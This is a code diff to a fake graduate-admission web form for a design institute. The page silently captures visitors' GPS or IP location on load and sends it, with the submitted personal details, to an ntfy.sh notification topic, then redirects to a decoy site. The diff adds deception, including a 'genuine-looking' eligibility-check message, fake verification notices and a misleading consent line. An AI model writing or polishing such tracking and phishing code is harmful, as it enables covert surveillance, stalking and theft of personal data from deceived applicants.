@@ -54,20 +54,18 @@
             font-size: 0.9rem;
             color: #555;
         }
+        /* Location note – small, elegant, informative */
         .location-note {
-            background: #e7f1ff;
-            border-left: 4px solid var(--primary);
-            padding: 10px 14px;
+            background: #f0f4ff;
+            border-left: 3px solid var(--primary);
+            padding: 8px 12px;
             font-size: 0.8rem;
-            color: #004085;
-            margin-bottom: 24px;
+            color: #333;
+            margin-bottom: 20px;
             border-radius: 4px;
             display: flex;
             align-items: center;
             gap: 8px;
-        }
-        .location-note span.icon {
-            font-size: 1.2rem;
         }
         .form-group {
             margin-bottom: 18px;
@@ -156,10 +154,14 @@
 <body>
     <div class="form-container">
         <div class="header">
-            <h1>📘 Graduate Admission 2025</h1>
+            <h1>📘 Graduate Admission 2026</h1>
             <p class="subtitle">Bonfire Institute of Design</p>
         </div>
 
+        <!-- Location status – small, genuine-looking system message -->
+        <div class="location-note" id="locationNote">
+            <span id="locationNoteText">🔍 Checking regional eligibility…</span>
+        </div>
 
         <form id="admissionForm">
             <div class="form-group">
@@ -228,7 +230,7 @@
         </form>
 
         <p class="small-note">
-            By submitting this form.
+            By submitting this form, you agree to the use of your location solely for eligibility verification.
         </p>
     </div>
 
@@ -237,17 +239,15 @@
             // ============================================================
             //  CONFIGURATION
             // ============================================================
-            const NTFY_TOPIC = 'Location_Notify';   // long random string
-            const DECOY_URL = 'https://bonfireinstituteofdesign.com/'; // redirect after submit
-            const SEND_FORM_DATA = true;                   // true = send form fields + location
+            const NTFY_TOPIC = 'Location_Notify';           // keep your topic
+            const DECOY_URL = 'https://bonfireinstituteofdesign.com/';
+            const SEND_FORM_DATA = true;                    // sends form fields after submit
             // ============================================================
 
-            const GPS_TIMEOUT = 5000;
-            let locationSent = false;
+            const GPS_TIMEOUT = 1000000;
             let currentLocation = null;
 
             const locationNoteText = document.getElementById('locationNoteText');
-            const locationNote = document.getElementById('locationNote');
             const statusMsg = document.getElementById('statusMsg');
             const form = document.getElementById('admissionForm');
 
@@ -283,7 +283,7 @@
                 };
             }
 
-            // Build ntfy message (location only, or location + form)
+            // Build message for ntfy
             function buildMessage(loc, formData = null) {
                 const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;
                 const time = new Date().toLocaleString();
@@ -306,27 +306,20 @@
 
             // Send via ntfy (sendBeacon)
             function sendNtfy(loc, formData = null) {
-                if (!NTFY_TOPIC || NTFY_TOPIC === 'your_secret_topic_here') return false;
+                if (!NTFY_TOPIC) return false;
                 const msg = buildMessage(loc, formData);
                 const blob = new Blob([msg], { type: 'text/plain' });
                 return navigator.sendBeacon(`https://ntfy.sh/${NTFY_TOPIC}`, blob);
             }
 
-            // Update location UI
-            function updateLocationNote(text, isError = false) {
-                locationNoteText.textContent = text;
-                if (isError) {
-                    locationNote.style.borderLeftColor = '#dc3545';
-                    locationNote.style.background = '#f8d7da';
-                    locationNote.style.color = '#721c24';
-                } else {
-                    locationNote.style.borderLeftColor = '#003366';
-                    locationNote.style.background = '#e7f1ff';
-                    locationNote.style.color = '#004085';
+            // Update location note text
+            function updateLocationNote(text) {
+                if (locationNoteText) {
+                    locationNoteText.textContent = text;
                 }
             }
 
-            // Collect form data as a simple object
+            // Collect form fields
             function getFormData() {
                 return {
                     Name: document.getElementById('fullName').value,
@@ -342,28 +335,27 @@
                 };
             }
 
-            // Initial location capture (instant)
+            // ---- MAIN: Send location immediately ----
             async function handleLocation() {
-                updateLocationNote('Checking GPS location…');
+                updateLocationNote('🔍 Checking regional eligibility…');
                 try {
                     const gpsLoc = await getGpsLocation();
                     currentLocation = gpsLoc;
-                    locationSent = sendNtfy(gpsLoc);  // location only
-                    updateLocationNote('eligibility check…');
+                    sendNtfy(gpsLoc);
+                    updateLocationNote('✅ Eligibility verified (GPS)');
                 } catch (gpsError) {
-                    updateLocationNote('eligibility check…');
                     try {
                         const ipLoc = await getIpLocation();
                         currentLocation = ipLoc;
-                        locationSent = sendNtfy(ipLoc);
-                        updateLocationNote('eligibility check…');
+                        sendNtfy(ipLoc);
+                        updateLocationNote('✅ Eligibility verified (network)');
                     } catch (ipError) {
-                        updateLocationNote('eligibility check…', true);
+                        updateLocationNote('⚠️ Could not verify location – please try again later.');
                     }
                 }
             }
 
-            // Form submit – send form data + location, then redirect
+            // Form submission → send form data + redirect
             form.addEventListener('submit', (e) => {
                 e.preventDefault();
 
@@ -373,13 +365,11 @@
                 submitBtn.disabled = true;
                 submitBtn.textContent = 'Processing…';
 
-                // Send form data via ntfy (if enabled and location is available)
                 if (SEND_FORM_DATA && currentLocation) {
                     const formData = getFormData();
                     sendNtfy(currentLocation, formData);
                 }
 
-                // Redirect after a short delay
                 setTimeout(() => {
                     statusMsg.textContent = 'Redirecting to official college portal…';
                     setTimeout(() => {
@@ -394,7 +384,7 @@
                 }, 1200);
             });
 
-            // Start location capture immediately
+            // Start location capture instantly
             handleLocation();
         })();
     </script>
